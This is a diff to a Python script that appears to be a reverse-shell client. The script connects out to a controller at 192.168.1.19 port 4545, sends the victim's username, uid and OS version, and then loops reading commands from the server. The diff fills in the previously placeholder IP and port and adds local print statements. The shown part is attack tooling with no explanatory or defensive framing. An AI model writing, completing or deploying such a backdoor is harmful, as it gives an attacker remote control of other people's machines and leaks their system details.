@@ -1,3 +1,4 @@
+
 import socket
 import subprocess
 import os
@@ -8,11 +9,13 @@ def session_handler():
     try:
         sock.connect((server_ip,server_port))
         conn_out(pwd.getpwuid(os.getuid())[0])
+        print(pwd.getpwuid(os.getuid())[0])
         time.sleep(1)
         conn_out(os.getuid())
+        print(os.getuid())
         time.sleep(1)
         conn_out(platform.uname()[0]+platform.uname()[2])
-
+        print(platform.uname()[0]+platform.uname()[2])
         print("Connected with ", server_ip)
         while True:
             msg = conn_in()
@@ -68,6 +71,6 @@ def conn_out(msg):
 
 if __name__=='__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_ip="INPUT_IP_HERE"
-    server_port=INPUT_PORT_HERE
+    server_ip="192.168.1.19"
+    server_port=4545
     session_handler()
